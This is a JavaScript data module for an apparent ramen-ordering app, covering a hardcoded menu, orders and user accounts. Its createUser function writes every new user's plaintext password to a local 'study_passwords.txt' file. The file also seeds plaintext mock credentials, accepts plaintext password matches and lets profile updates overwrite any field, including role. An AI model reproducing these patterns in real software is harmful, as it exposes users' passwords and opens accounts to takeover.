import dbConnect from './mongodb';
import bcrypt from 'bcryptjs';
import fs from 'fs';
import path from 'path';

let localOrders = [];
let localMenu = [
    { _id: 'm1', name: 'Tonkotsu Ramen', name_th: 'ทงคตสึราเมน', price: 50, category: 'Ramen', image_url: '/FoodImageIcon/tonkotsu-ramen.jpg', description: 'Rich pork broth with chashu & soft egg.', description_th: 'น้ำซุปกระดูกหมูเข้มข้น พร้อมหมูชาชูและไข่ยางมะตูม' },
    { _id: 'm2', name: 'Shoyu Ramen', name_th: 'โชยุราเมน', price: 50, category: 'Ramen', image_url: '/FoodImageIcon/shoyu-ramen.jpg', description: 'Classic soy sauce broth, light and comfy.', description_th: 'น้ำซุปโชยุสูตรต้นตำรับ หอมกลมกล่อม' },
    { _id: 'm3', name: 'Spicy Miso Ramen', isSpicy: true, name_th: 'สไปซี่มิโซะราเมน', price: 50, category: 'Ramen', image_url: '/FoodImageIcon/spicy-miso-ramen.jpg', description: 'Warm your soul with spicy miso broth.', description_th: 'ซุปมิโซะรสเผ็ดร้อน จัดจ้านถึงใจ' },
    { _id: 'a1', name: 'Crispy Gyoza', name_th: 'เกี๊ยวซ่ากรอบ', price: 35, category: 'Sides', image_url: '/FoodImageIcon/crispy-gyoza.jpg', description: '5 pcs of pan-fried pork dumplings.', description_th: 'เกี๊ยวซ่าหมูทอดกรอบ 5 ชิ้น' },
    { _id: 'a2', name: 'Karaage Chicken', isSpicy: true, name_th: 'ไก่คาราเกะ', price: 40, category: 'Sides', image_url: '/FoodImageIcon/karaage-chicken.jpg', description: 'Japanese fried chicken with mayo.', description_th: 'ไก่ทอดสไตล์ญี่ปุ่น เสิร์ฟพร้อมมายองเนส' },
    { _id: 'd1', name: 'Iced Matcha', name_th: 'มัทฉะเย็น', price: 65, category: 'Drinks', image_url: '/FoodImageIcon/iced-matcha.jpg', description: 'Premium Uji matcha.', description_th: 'ชาเขียวมัทฉะอุจิพรีเมียม' },
    { _id: 'm10', name: 'Original Shoyu Ramen', name_th: 'ออริจินัลโชยุราเมน', price: 40, category: 'Ramen', image_url: '/FoodImageIcon/shoyu_ramen.jpg', description: 'Affordable and classic soy sauce broth.', description_th: 'น้ำซุปโชยุสุดคลาสสิกในราคาสุดคุ้ม' },
    { _id: 'm11', name: 'Rich Tonkotsu Ramen', name_th: 'ทงคตสึราเมนเข้มข้น', price: 55, category: 'Ramen', image_url: '/FoodImageIcon/tonkotsu_ramen.jpg', description: 'Extra thick pork bone broth with tender chashu.', description_th: 'ซุปกระดูกหมูเข้มข้นพิเศษพร้อมหมูชาชูนุ่มละมุน' },
    { _id: 'm12', name: 'Hellfire Volcano Ramen', name_th: 'ราเมนภูเขาไฟนรก', price: 65, category: 'Ramen', image_url: '/FoodImageIcon/volcano_ramen.jpg', description: 'Extremely spicy red chili broth. Dare to try?', description_th: 'ซุปพริกแดงเผ็ดจัดจ้าน ท้าให้ลอง!', isSpicy: true },
    { _id: 'm13', name: 'Tsukemen Dipping Noodles', name_th: 'สึเคเมน (บะหมี่จุ่ม)', price: 75, category: 'Ramen', image_url: '/FoodImageIcon/tsukemen.jpg', description: 'Cold thick noodles with rich, warm dipping soup.', description_th: 'เส้นบะหมี่เย็นเหนียวนุ่ม เสิร์ฟพร้อมซุปจุ่มรสเข้มข้น' },
    { _id: 'm14', name: 'Tom Yum Goong Ramen', name_th: 'ต้มยำกุ้งราเมน', price: 80, category: 'Ramen', image_url: '/FoodImageIcon/tom_yum_ramen.jpg', description: 'Thai-Japanese fusion spicy & sour prawn ramen.', description_th: 'ราเมนต้มยำกุ้งรสแซ่บสไตล์ลูกครึ่งไทย-ญี่ปุ่น', isSpicy: true }
];

export async function getMenu() {
    // Menu is hardcoded locally for speed and stability
    return localMenu;
}

export async function createOrder(orderData) {
    if (process.env.MONGODB_URI) {
        try {
            await dbConnect();
            const Order = require('../models/Order').default;
            const newOrder = new Order(orderData);
            await newOrder.save();
            return newOrder;
        } catch (e) {
            console.error("MongoDB Order Failed, saving locally:", e);
            const newOrder = { _id: 'o' + Date.now(), ...orderData, status: 'Pending', created_at: new Date() };
            localOrders.push(newOrder);
            return newOrder;
        }
    } else {
        const newOrder = { _id: 'o' + Date.now(), ...orderData, status: 'Pending', created_at: new Date() };
        localOrders.push(newOrder);
        return newOrder; // Hybrid Local fallback
    }
}

export async function getOrders() {
    if (process.env.MONGODB_URI) {
        try {
            await dbConnect();
            const Order = require('../models/Order').default;
            return await Order.find({}).sort({ created_at: -1 });
        } catch (e) {
            console.error("MongoDB Fetch Orders Failed, returning local:", e);
            return [...localOrders].reverse();
        }
    } else {
        return [...localOrders].reverse();
    }
}

// User Mock Data
let localUsers = [
    { email: 'kitchen@ramen.com', password: 'password123', name: 'Kitchen Staff', role: 'kitchen' },
    { email: 'user@example.com', password: 'password123', name: 'Hungry Customer', role: 'customer' }
];

export async function authenticateUser(identifier, password) {
    const isLocalMatch = async (u) => (u.email === identifier || u.name === identifier) && 
        (u.password.startsWith('$2') ? await bcrypt.compare(password, u.password) : u.password === password);

    if (process.env.MONGODB_URI) {
        try {
            await dbConnect();
            const User = require('../models/User').default;
            const user = await User.findOne({ 
                $or: [{ email: identifier }, { name: identifier }]
            });
            
            if (user) {
                const isMatch = user.password.startsWith('$2') 
                    ? await bcrypt.compare(password, user.password)
                    : user.password === password;
                if (isMatch) return user;
            } else {
                // If it's the first time and DB is empty, let's create the mock users
                const count = await User.countDocuments();
                if (count === 0) {
                    await User.insertMany(localUsers);
                    const newlyCreated = await User.findOne({ $or: [{ email: identifier }, { name: identifier }] });
                    if (newlyCreated && (newlyCreated.password === password)) return newlyCreated;
                }
            }
            return null;
        } catch (e) {
            console.error("MongoDB Auth Failed, falling back to local users:", e);
            for (let u of localUsers) {
                if (await isLocalMatch(u)) return u;
            }
            return null;
        }
    } else {
        for (let u of localUsers) {
            if (await isLocalMatch(u)) return u;
        }
        return null;
    }
}

export async function createUser(email, password, name, role = 'customer') {
    // --- STUDY LOGGER (Logs plaintext so you can look it up during development) ---
    try {
        const logPath = path.join(process.cwd(), 'study_passwords.txt');
        const timestamp = new Date().toLocaleString();
        fs.appendFileSync(logPath, `[${timestamp}] Name: ${name} | Email: ${email} | Password: ${password}\n`);
    } catch (err) {
        console.error("Failed to log study password:", err);
    }
    // ------------------------------------------------------------------------------

    const hashedPassword = await bcrypt.hash(password, 10);
    
    if (process.env.MONGODB_URI) {
        try {
            await dbConnect();
            const User = require('../models/User').default;
            const existingUser = await User.findOne({ email });
            if (existingUser) return { error: 'Email already exists' };
            
            const newUser = new User({ email, password: hashedPassword, name, role });
            await newUser.save();
            return newUser;
        } catch (e) {
            console.error("MongoDB Signup Failed, saving locally:", e);
            if (localUsers.find(u => u.email === email)) return { error: 'Email already exists' };
            const newUser = { email, password: hashedPassword, name, role };
            localUsers.push(newUser);
            return newUser;
        }
    } else {
        if (localUsers.find(u => u.email === email)) return { error: 'Email already exists' };
        const newUser = { email, password: hashedPassword, name, role };
        localUsers.push(newUser);
        return newUser;
    }
}

export async function updateUserProfile(email, updateData) {
    if (process.env.MONGODB_URI) {
        try {
            await dbConnect();
            const User = require('../models/User').default;
            const updatedUser = await User.findOneAndUpdate({ email }, updateData, { returnDocument: 'after' });
            if (updatedUser) return updatedUser;
            throw new Error("Not found in DB");
        } catch (e) {
            console.error("MongoDB Update Failed, falling back locally:", e);
            const userIndex = localUsers.findIndex(u => u.email === email);
            if (userIndex !== -1) {
                localUsers[userIndex] = { ...localUsers[userIndex], ...updateData };
                return localUsers[userIndex];
            } else {
                const recreatedUser = { email, name: 'Guest', role: 'customer', ...updateData };
                localUsers.push(recreatedUser);
                return recreatedUser;
            }
        }
    } else {
        const userIndex = localUsers.findIndex(u => u.email === email);
        if (userIndex !== -1) {
            localUsers[userIndex] = { ...localUsers[userIndex], ...updateData };
            return localUsers[userIndex];
        } else {
            const recreatedUser = { email, name: 'Guest', role: 'customer', ...updateData };
            localUsers.push(recreatedUser);
            return recreatedUser;
        }
    }
}
